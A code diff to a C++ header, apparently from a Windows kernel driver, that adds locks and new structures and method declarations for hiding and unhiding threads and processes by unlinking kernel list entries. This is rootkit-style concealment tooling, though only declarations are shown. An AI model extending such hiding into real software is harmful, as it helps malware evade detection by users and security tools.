@@ -25,6 +25,7 @@ struct OutputProtectedProcessesList {
 };
 
 struct ProtectedProcessesList {
+	FastMutex Lock;
 	ULONG LastIndex;
 	ULONG PidsCount;
 	ULONG Processes[MAX_PIDS];
@@ -46,6 +47,7 @@ struct HiddenProcessListItem {
 };
 
 struct HiddenProcessList {
+	FastMutex Lock;
 	ULONG LastIndex;
 	ULONG PidsCount;
 	HiddenProcessListItem Processes[MAX_PIDS];
@@ -68,21 +70,44 @@ struct OutputThreadsList {
 };
 
 struct ThreadsList {
+	FastMutex Lock;
 	ULONG LastIndex;
 	ULONG TidsCount;
 	ULONG Threads[MAX_TIDS];
 };
 
+struct InputHiddenThread {
+	ULONG Tid;
+	bool Hide;
+};
+
+struct HiddenThread {
+	ULONG Pid;
+	ULONG Tid;
+	PLIST_ENTRY ListEntry;
+};
+
+struct HiddenThreadsList {
+	FastMutex Lock;
+	ULONG LastIndex;
+	ULONG TidsCount;
+	HiddenThread HiddenThreads[MAX_TIDS];
+};
+
 class ProcessUtils {
 private:
-	FastMutex ThreadsLock;
 	ThreadsList ProtectedThreads;
+	HiddenThreadsList HiddenThreads;
 	ProtectedProcessesList ProtectedProcesses;
 	HiddenProcessList HiddenProcesses;
-	FastMutex ProcessesLock;
 
-	bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid);
-	PLIST_ENTRY GetHiddenProcess(DWORD pid);
+	bool AddHiddenProcess(PLIST_ENTRY entry, ULONG pid);
+	PLIST_ENTRY GetHiddenProcess(ULONG pid);
+	void ClearHiddenProcesses();
+	bool AddHiddenThread(HiddenThread thread);
+	HiddenThread GetHiddenThread(ULONG tid);
+	NTSTATUS UnhideThread(HiddenThread thread);
+	void ClearHiddenThreads();
 	void RemoveListLinks(PLIST_ENTRY current);
 	void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);
 
@@ -105,9 +130,9 @@ public:
 	bool RemoveThread(ULONG tid);
 	void QueryProtectedThreads(OutputThreadsList* list);
 	NTSTATUS HideThread(ULONG tid);
+	NTSTATUS UnhideThread(ULONG tid);
 
 	void ClearProtectedProcesses();
-	void ClearHiddenProcesses();
 	bool FindProcess(ULONG pid);
 	bool AddProcess(ULONG pid);
 	bool RemoveProcess(ULONG pid);
